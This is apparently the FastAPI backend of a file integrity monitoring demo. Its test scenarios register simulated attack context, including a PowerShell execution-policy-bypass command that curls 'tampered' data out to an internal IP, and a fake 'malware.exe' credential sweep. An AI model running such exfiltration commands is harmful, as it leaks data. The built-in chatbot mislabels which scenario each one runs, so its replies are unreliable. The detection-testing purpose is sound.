import os
import shutil
import uvicorn
from fastapi import FastAPI, HTTPException, BackgroundTasks, UploadFile, File, Form
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel
from typing import Dict, List, Optional
from datetime import datetime

# Import backend modules
from src.backend.config import MONITORED_DIR, QUARANTINE_DIR, ENFORCEMENT_MODE, DB_PATH
import src.backend.config as config
from src.backend.forensic_logger import ForensicLogger
from src.backend.context_collector import register_simulated_context
from src.backend.fim_service import FileIntegrityMonitor, create_initial_baseline, clear_self_tampering_status
from src.backend.attestation_engine import (
    start_attestation_monitoring, get_runtime_trust, set_fim_status,
    trigger_simulated_attestation_violation, clear_simulated_attestation_violations,
    perform_attestation_check, establish_attestation_baseline
)
from src.backend.ml_engine import AnomalyDetector
from src.backend.correlation_engine import CorrelationEngine
from src.backend.risk_engine import calculate_risk_score
from src.backend.llm_reasoning import analyze_threat_llm
from src.backend.response_engine import (
    handle_autonomous_response, get_pending_approvals, approve_action, reject_action, backup_file
)

app = FastAPI(title="AI-Powered FIM & Threat Analysis System API")

@app.middleware("http")
async def add_no_cache_header(request, call_next):
    response = await call_next(request)
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

logger = ForensicLogger()

# Global instances initialized on startup
anomaly_detector = None
correlation_engine = None
fim_monitor = None

# Pipeline event callback
def handle_fim_event(event_record):
    """
    Core security pipeline triggered on any file system modification.
    Wires: FIM -> Context -> ML -> Trust -> Correlation -> Risk -> MITRE -> LLM -> Response -> Log
    """
    global anomaly_detector, correlation_engine
    
    try:
        # 1. Fetch current Runtime Trust metrics
        trust_metrics = get_runtime_trust()
        
        # 2. Compute ML anomaly scores
        anomaly_metrics = anomaly_detector.compute_anomaly_scores(event_record, trust_metrics["score"])
        
        # 3. Correlate event into temporal incident
        incident = correlation_engine.add_event(event_record)
        
        # 4. Calculate synthesized risk score
        risk_result = calculate_risk_score(event_record, anomaly_metrics, trust_metrics)
        
        # 5. Enrich incident dictionary (risk aggregation)
        if "risk_score" in incident:
            incident["risk_score"] = max(incident["risk_score"], risk_result["risk_score"])
            # Update threat classification
            if incident["risk_score"] >= 80:
                incident["threat_classification"] = "CRITICAL"
            elif incident["risk_score"] >= 60:
                incident["threat_classification"] = "HIGH RISK"
            elif incident["risk_score"] >= 30:
                incident["threat_classification"] = "SUSPICIOUS"
            else:
                incident["threat_classification"] = "NORMAL"
                
            if risk_result.get("mitre_mapping"):
                incident["mitre_mapping"] = risk_result["mitre_mapping"]
        else:
            incident.update(risk_result)
            
        incident["isolation_forest_score"] = anomaly_metrics["isolation_forest_score"]
        incident["autoencoder_score"] = anomaly_metrics["autoencoder_score"]
        incident["anomaly_score"] = anomaly_metrics["anomaly_score"]
        incident["runtime_trust_score"] = trust_metrics["score"]
        
        # 6. Generate explainable RAG threat summary
        analysis = analyze_threat_llm(incident)
        incident["llm_summary"] = analysis["summary"]
        incident["llm_reasoning"] = analysis["reasoning"]
        incident["llm_action"] = analysis["action"]
        
        # 7. Log consolidated incident to Database
        incident_id = logger.log_incident(incident)
        incident["id"] = incident_id
        
        # 8. Trigger response action (simulation/enforcement)
        response_msg = handle_autonomous_response(incident, incident_id)
        incident["response_triggered"] = response_msg
        
    except Exception as e:
        import traceback
        traceback.print_exc()

# Models
class ConfigUpdateRequest(BaseModel):
    enforcement_mode: bool
    monitored_directory: Optional[str] = None
    quarantine_directory: Optional[str] = None

class FolderConfigRequest(BaseModel):
    folder_path: str
    create_if_missing: bool = True

class AttestationViolationRequest(BaseModel):
    violation_type: str
    penalty: int
    details: str

class ApprovalRequest(BaseModel):
    approval_id: str

class ChatAssistantRequest(BaseModel):
    message: str

class SimulatedContextRequest(BaseModel):
    file_path: str
    username: str
    process_id: int
    process_name: str
    process_path: str
    parent_process_id: int
    parent_process_name: str
    command_line: str

@app.on_event("startup")
def startup_event():
    global anomaly_detector, correlation_engine, fim_monitor
    
    # 1. Initialize ML and Correlation modules
    anomaly_detector = AnomalyDetector()
    correlation_engine = CorrelationEngine()
    
    # 2. Establish baseline hashes and backups
    create_baseline_and_backups()
    clear_self_tampering_status()
    establish_attestation_baseline()
    
    # 3. Start attestation periodic loops
    start_attestation_monitoring(interval_sec=5)
    set_fim_status(True)
    
    # 4. Start real-time file monitoring
    fim_monitor = FileIntegrityMonitor(on_event_callback=handle_fim_event)
    fim_monitor.start()

@app.on_event("shutdown")
def shutdown_event():
    global fim_monitor
    if fim_monitor:
        fim_monitor.stop()
        set_fim_status(False)

def create_baseline_and_backups():
    """Builds the file baseline hash database and copies files to backup cache."""
    create_initial_baseline()
    baselines = logger.get_all_baselines()
    for b in baselines:
        backup_file(b["file_path"])

# --- API ENDPOINTS ---

@app.get("/api/status")
def get_system_status():
    trust = get_runtime_trust()
    # Check if there are active incidents to determine threat level
    incidents = logger.get_recent_incidents(limit=1)
    current_threat = "NORMAL"
    if incidents:
        # Check if the incident happened in the last 5 minutes (300 seconds)
        time_diff = datetime.now() - datetime.fromisoformat(incidents[0]["timestamp"])
        if time_diff.total_seconds() < 300:
            current_threat = incidents[0]["threat_classification"]

    return {
        "status": "Running",
        "monitored_directory": config.MONITORED_DIR,
        "quarantine_directory": config.QUARANTINE_DIR,
        "enforcement_mode": config.ENFORCEMENT_MODE,
        "system_trust_score": trust["score"],
        "system_trust_state": trust["state"],
        "current_threat_level": current_threat,
        "database_file": DB_PATH
    }

@app.get("/api/events")
def get_events(limit: int = 100):
    return logger.get_recent_events(limit)

@app.get("/api/attestation")
def get_attestation():
    trust = get_runtime_trust()
    history = logger.get_recent_attestations(limit=30)
    return {
        "current": trust,
        "history": history
    }

@app.get("/api/incidents")
def get_incidents(limit: int = 50):
    return logger.get_recent_incidents(limit)

@app.get("/api/responses")
def get_responses(limit: int = 50):
    return logger.get_recent_responses(limit)

@app.get("/api/approvals")
def get_approvals():
    return get_pending_approvals()

@app.post("/api/approvals/approve")
def approve_pending_action(request: ApprovalRequest):
    success = approve_action(request.approval_id)
    if not success:
        raise HTTPException(status_code=404, detail="Approval request ID not found.")
    return {"status": "success", "message": "Action executed successfully."}

@app.post("/api/approvals/reject")
def reject_pending_action(request: ApprovalRequest):
    success = reject_action(request.approval_id)
    if not success:
        raise HTTPException(status_code=404, detail="Approval request ID not found.")
    return {"status": "success", "message": "Action rejected and removed."}

@app.post("/api/configure")
def update_configuration(request: ConfigUpdateRequest):
    config.ENFORCEMENT_MODE = request.enforcement_mode
    if request.monitored_directory:
        # Restart watchdog with new folder if modified
        global fim_monitor
        if os.path.exists(request.monitored_directory):
            config.MONITORED_DIR = os.path.abspath(request.monitored_directory)
            if fim_monitor:
                fim_monitor.stop()
                create_baseline_and_backups()
                fim_monitor = FileIntegrityMonitor(on_event_callback=handle_fim_event)
                fim_monitor.start()
    return {
        "status": "success", 
        "enforcement_mode": config.ENFORCEMENT_MODE,
        "monitored_directory": config.MONITORED_DIR
    }

@app.post("/api/simulate-tampering")
def simulate_tampering(request: AttestationViolationRequest):
    if request.penalty == 0:
        clear_simulated_attestation_violations()
        clear_self_tampering_status()
        establish_attestation_baseline()
        perform_attestation_check()
        return {"status": "success", "message": "Cleared simulated violations."}
        
    trigger_simulated_attestation_violation(
        violation_type=request.violation_type,
        penalty_points=request.penalty,
        details=request.details
    )
    perform_attestation_check()
    return {"status": "success", "message": f"Injected violation '{request.violation_type}' successfully."}

@app.post("/api/run-baseline")
def run_baseline_rebuild():
    create_baseline_and_backups()
    clear_self_tampering_status()
    establish_attestation_baseline()
    perform_attestation_check()
    return {"status": "success", "message": "Baseline rebuilt and backed up successfully."}

@app.post("/api/upload-files")
async def upload_files(
    files: List[UploadFile] = File(...),
    clear_existing: bool = Form(False),
    subfolder: Optional[str] = Form(None)
):
    """
    Accepts arbitrary file uploads (PDF, Word, Excel, code, text, etc.) or folders.
    Optionally clears existing sample files to monitor uploaded files alone.
    Establishes cryptographic SHA-256 baselines and backup caches immediately.
    """
    target_dir = config.MONITORED_DIR
    if subfolder:
        clean_sub = os.path.basename(subfolder.strip().replace("\\", "/"))
        target_dir = os.path.join(config.MONITORED_DIR, clean_sub)
    os.makedirs(target_dir, exist_ok=True)

    from src.backend.response_engine import suppress_path_events

    # If user selected to monitor uploaded files alone, clear the previous sample files
    if clear_existing:
        for item in os.listdir(config.MONITORED_DIR):
            item_path = os.path.join(config.MONITORED_DIR, item)
            try:
                suppress_path_events(item_path, duration_sec=3.0)
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path) and os.path.abspath(item_path) != os.path.abspath(target_dir):
                    shutil.rmtree(item_path)
            except Exception:
                pass

    uploaded_names = []
    for file in files:
        if not file.filename:
            continue
        clean_rel = file.filename.replace("\\", "/").strip("/")
        dest_path = os.path.join(target_dir, os.path.normpath(clean_rel))
        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
        
        # Suppress watcher event during initial write
        suppress_path_events(dest_path, duration_sec=4.0)
        content = await file.read()
        with open(dest_path, "wb") as f:
            f.write(content)
        uploaded_names.append(os.path.basename(dest_path))

    # Re-establish golden baseline and backup cache for the newly added files
    create_baseline_and_backups()
    clear_self_tampering_status()
    establish_attestation_baseline()
    perform_attestation_check()

    baselines = logger.get_all_baselines()
    return {
        "status": "success",
        "message": f"Successfully protected and indexed {len(uploaded_names)} file(s).",
        "uploaded_files": uploaded_names,
        "monitored_directory": config.MONITORED_DIR,
        "total_files_monitored": len(baselines)
    }

@app.post("/api/set-monitored-folder")
def set_monitored_folder(request: FolderConfigRequest):
    """
    Shifts the active FIM watcher to an arbitrary specified folder on the system.
    """
    folder_path = os.path.abspath(request.folder_path)
    if not os.path.exists(folder_path):
        if request.create_if_missing:
            os.makedirs(folder_path, exist_ok=True)
        else:
            raise HTTPException(status_code=400, detail=f"Directory '{folder_path}' does not exist.")

    global fim_monitor
    config.MONITORED_DIR = folder_path
    
    if fim_monitor:
        fim_monitor.stop()
        create_baseline_and_backups()
        clear_self_tampering_status()
        establish_attestation_baseline()
        fim_monitor = FileIntegrityMonitor(on_event_callback=handle_fim_event)
        fim_monitor.start()
    else:
        create_baseline_and_backups()
        
    baselines = logger.get_all_baselines()
    return {
        "status": "success",
        "message": f"Active monitored directory switched to '{folder_path}'.",
        "monitored_directory": config.MONITORED_DIR,
        "total_files_monitored": len(baselines)
    }

@app.post("/api/restore-default-files")
def restore_default_files():
    """
    Restores the standard 8 enterprise demo files into monitored_dir.
    """
    sample_files = {
        "credentials.txt": "ADMIN_HASH=8f9a2b7c4d5e6f8a... Timestamp: 1788185416\n",
        "normal_document.txt": "This is a standard enterprise document for benign operational edits.\n",
        "policy.json": "{\n  \"access_control\": \"enforce_mfa\",\n  \"allow_guest_login\": false\n}\n",
        "private.key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0wM5Z3zV8K7rN2o+K1QyB4V2w6+f/mK5eLpG9s7V2K3j5b1d\n-----END RSA PRIVATE KEY-----\n",
        "config.json": "{\n  \"system\": {\"environment\": \"production\", \"version\": \"2.4.1\"}\n}\n",
        "database.env": "DB_HOST=10.0.12.45\nDB_PORT=5432\nDB_NAME=aether_vault\n",
        "firewall_rules.conf": "# Enterprise Host Firewall Policy\n*filter\n:INPUT DROP [0:0]\nCOMMIT\n",
        "customer_records.csv": "record_id,customer_id,status\nREC-1001,CUST-US-89102,Active\n"
    }
    os.makedirs(config.MONITORED_DIR, exist_ok=True)
    from src.backend.response_engine import suppress_path_events
    for fname, content in sample_files.items():
        fpath = os.path.join(config.MONITORED_DIR, fname)
        suppress_path_events(fpath, duration_sec=3.0)
        with open(fpath, "w") as f:
            f.write(content)
            
    create_baseline_and_backups()
    clear_self_tampering_status()
    establish_attestation_baseline()
    perform_attestation_check()
    
    baselines = logger.get_all_baselines()
    return {
        "status": "success",
        "message": "Default enterprise sample assets restored.",
        "monitored_directory": config.MONITORED_DIR,
        "total_files_monitored": len(baselines)
    }

@app.post("/api/register-simulated-context")
def register_context(request: SimulatedContextRequest):
    context = {
        "username": request.username,
        "process_id": request.process_id,
        "process_name": request.process_name,
        "process_path": request.process_path,
        "parent_process_id": request.parent_process_id,
        "parent_process_name": request.parent_process_name,
        "command_line": request.command_line
    }
    register_simulated_context(request.file_path, context)
    return {"status": "success", "message": f"Registered simulated context for {request.file_path}."}

@app.get("/api/baselines")
def get_baselines():
    return logger.get_all_baselines()

class TriggerTestRequest(BaseModel):
    scenario_id: int

def run_test_scenario_async(scenario_id: int):
    import time
    os.makedirs(MONITORED_DIR, exist_ok=True)
    
    if scenario_id == 1:
        # Scenario 1: Normal Modification
        file_path = os.path.join(MONITORED_DIR, "normal_document.txt")
        context = {
            "username": "Vidhy",
            "process_id": 2048,
            "process_name": "explorer.exe",
            "process_path": "C:\\windows\\explorer.exe",
            "parent_process_id": 1024,
            "parent_process_name": "userinit.exe",
            "command_line": "explorer.exe"
        }
        register_simulated_context(file_path, context)
        with open(file_path, "w") as f:
            f.write(f"Normal text file modification data. Timestamp: {time.time()}")
            
    elif scenario_id == 2:
        # Scenario 2: Suspicious Modification
        file_path = os.path.join(MONITORED_DIR, "credentials.txt")
        context = {
            "username": "Administrator",
            "process_id": 9999,
            "process_name": "malware.exe",
            "process_path": "C:\\Users\\Vidhy\\AppData\\Local\\Temp\\malware.exe",
            "parent_process_id": 4096,
            "parent_process_name": "cmd.exe",
            "command_line": "malware.exe --sweep --target credentials.txt"
        }
        register_simulated_context(file_path, context)
        with open(file_path, "w") as f:
            f.write(f"ADMIN_HASH=8f9a2b7c4d5e6f8a... Timestamp: {time.time()}")
            
    elif scenario_id == 3:
        # Scenario 3: Runtime Tampering
        trigger_simulated_attestation_violation(
            violation_type="config_tampered",
            penalty_points=30,
            details="Critical configuration component 'config.py' has mismatched SHA-256 baseline (tampered)."
        )
        perform_attestation_check()
        
    elif scenario_id == 4:
        # Scenario 4: Attack Sequence
        trigger_simulated_attestation_violation(
            violation_type="fim_service_tampered",
            penalty_points=40,
            details="Security component file 'fim_service.py' was modified at runtime."
        )
        trigger_simulated_attestation_violation(
            violation_type="fim_process_stopped",
            penalty_points=50,
            details="File Integrity Monitoring process is not running."
        )
        perform_attestation_check()
        
        file_path = os.path.join(MONITORED_DIR, "policy.json")
        context = {
            "username": "Vidhy",
            "process_id": 4500,
            "process_name": "powershell.exe",
            "process_path": "C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_id": 4096,
            "parent_process_name": "cmd.exe",
            "command_line": "powershell.exe -ExecutionPolicy Bypass -Command curl http://192.168.1.205/receive?data=tampered"
        }
        register_simulated_context(file_path, context)
        with open(file_path, "w") as f:
            f.write(f"{{\"policy\": \"allow_all_unsigned_drivers\", \"timestamp\": {time.time()}}}")

@app.post("/api/trigger-test")
def trigger_test(request: TriggerTestRequest, background_tasks: BackgroundTasks):
    # Reset correlation state and clear attestation violations to cleanly isolate this test
    global correlation_engine
    if correlation_engine:
        correlation_engine.active_incident = None
    clear_simulated_attestation_violations()
    perform_attestation_check()
    
    background_tasks.add_task(run_test_scenario_async, request.scenario_id)
    return {"status": "success", "message": f"Scenario {request.scenario_id} triggered."}

@app.post("/api/assistant-chat")
def assistant_chat(request: ChatAssistantRequest, background_tasks: BackgroundTasks):
    msg = request.message.lower().strip()
    
    trust_info = get_runtime_trust()
    trust_score = trust_info.get("score", 100)
    trust_status = trust_info.get("status", "TRUSTED")
    recent_incidents = logger.get_recent_incidents(1)
    last_incident = recent_incidents[0] if recent_incidents else None
    
    action_triggered = None
    
    # Actionable commands
    if "simulate ransomware" in msg or "test ransomware" in msg or "scenario 1" in msg:
        background_tasks.add_task(run_test_scenario_async, 1)
        action_triggered = "ransomware_simulation"
        reply = "Executing Scenario 1: Simulated Ransomware Attack! Watchdog will detect the burst edits, isolate the rogue PID, and roll back files."
    elif "simulate policy" in msg or "tamper policy" in msg or "scenario 2" in msg:
        background_tasks.add_task(run_test_scenario_async, 2)
        action_triggered = "policy_tampering"
        reply = "Executing Scenario 2: Unauthorized Policy Modification. PowerShell is attempting to modify policy.json with bypass flags."
    elif "simulate credential" in msg or "harvest" in msg or "scenario 3" in msg:
        background_tasks.add_task(run_test_scenario_async, 3)
        action_triggered = "credential_harvesting"
        reply = "Executing Scenario 3: Credential Harvesting simulation. A suspicious process is accessing credentials.txt."
    elif "simulate tampering" in msg or "defense evasion" in msg or "scenario 4" in msg:
        background_tasks.add_task(run_test_scenario_async, 4)
        action_triggered = "defense_evasion"
        reply = "Executing Scenario 4: Defense Evasion simulation. Triggering MITRE CRA continuous attestation violation on security modules."
    elif "clear" in msg and ("violation" in msg or "alert" in msg or "attestation" in msg):
        clear_simulated_attestation_violations()
        perform_attestation_check()
        action_triggered = "clear_violations"
        reply = "All simulated attestation violations have been cleared. System runtime trust score restored to 100%."
    elif "switch to enforcement" in msg or "enable enforcement" in msg or "active mode" in msg:
        config.ENFORCEMENT_MODE = True
        action_triggered = "enforcement_enabled"
        reply = "Autonomous Enforcement Mode is now ACTIVE. Threats will be neutralized automatically."
    elif "switch to simulation" in msg or "disable enforcement" in msg or "simulation mode" in msg:
        config.ENFORCEMENT_MODE = False
        action_triggered = "simulation_enabled"
        reply = "Response mode switched to SIMULATION. Incidents will require manual approval."
    # Informational & Q&A queries
    elif "trust" in msg or "score" in msg or "attestation" in msg:
        penalties = trust_info.get("penalties", [])
        if penalties:
            details = "; ".join([p.get("type", "") for p in penalties])
            reply = f"Current Runtime Trust Score is {trust_score}% ({trust_status}). Detected violations: {details}."
        else:
            reply = f"System Runtime Trust is optimal at {trust_score}% ({trust_status}). All core security modules and kernel hashes match the baseline."
    elif "threat" in msg or "incident" in msg or "attack" in msg or "last" in msg:
        if last_incident:
            threat_cls = last_incident.get("threat_classification", "UNKNOWN")
            risk = last_incident.get("risk_score", 0)
            events = last_incident.get("events", [])
            file_name = os.path.basename(events[0].get("file_path", "unknown")) if events else "unknown file"
            proc = events[0].get("process_name", "unknown") if events else "unknown process"
            summary = last_incident.get("llm_summary") or f"{threat_cls} incident on {file_name} by {proc}."
            reply = f"Latest Incident: Classified as {threat_cls} with a Risk Score of {risk}/100. Target was {file_name} modified by {proc}. {summary}"
        else:
            reply = "No security incidents detected yet. All monitored directories and baseline hashes are fully intact."
    elif "soar" in msg or "rollback" in msg or "heal" in msg:
        reply = "Our SOAR engine works autonomously in two steps: First, it terminates the rogue process using psutil. Then, it performs an atomic file restoration from our tamper-resistant HMAC backup repository in milliseconds."
    elif "difference" in msg or "existing" in msg or "crowdstrike" in msg or "wazuh" in msg:
        reply = "Unlike tools like CrowdStrike or Wazuh which depend heavily on cloud servers, our system runs completely offline at the local edge, uses HMAC-protected snapshot rollbacks, and self-defends its own binaries via MITRE Continuous Runtime Attestation."
    elif "fim" in msg or "what is this" in msg or "explain project" in msg:
        reply = "This is an Autonomous File Integrity Monitoring and Threat Analysis System. It combines real-time kernel file hooks, process context interception, MITRE continuous attestation, and Isolation Forest machine learning to defeat ransomware and unauthorized tampering."
    elif "hello" in msg or "hi" in msg or "hey" in msg:
        reply = f"Hello! I am Aether-Bot, your Autonomous SOC Copilot. System trust is currently at {trust_score}%. You can speak or type to ask about threats, explain concepts, or test attacks!"
    elif "help" in msg:
        reply = "You can ask me: 'What is our trust score?', 'Explain the last threat', 'Simulate ransomware attack', 'How does SOAR rollback work?', or 'What makes this project different?'"
    else:
        reply = f"Received: '{request.message}'. System is monitoring with a trust score of {trust_score}%. Say 'help' or click a prompt chip for suggestions!"
        
    return {
        "status": "success",
        "reply": reply,
        "action": action_triggered,
        "trust_score": trust_score
    }

# Serve dashboard frontend static assets
frontend_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "frontend"))
if os.path.exists(frontend_dir):
    app.mount("/", StaticFiles(directory=frontend_dir, html=True), name="frontend")
else:
    @app.get("/")
    def index_fallback():
        return {"status": "Running", "message": "Frontend static folder not found yet."}

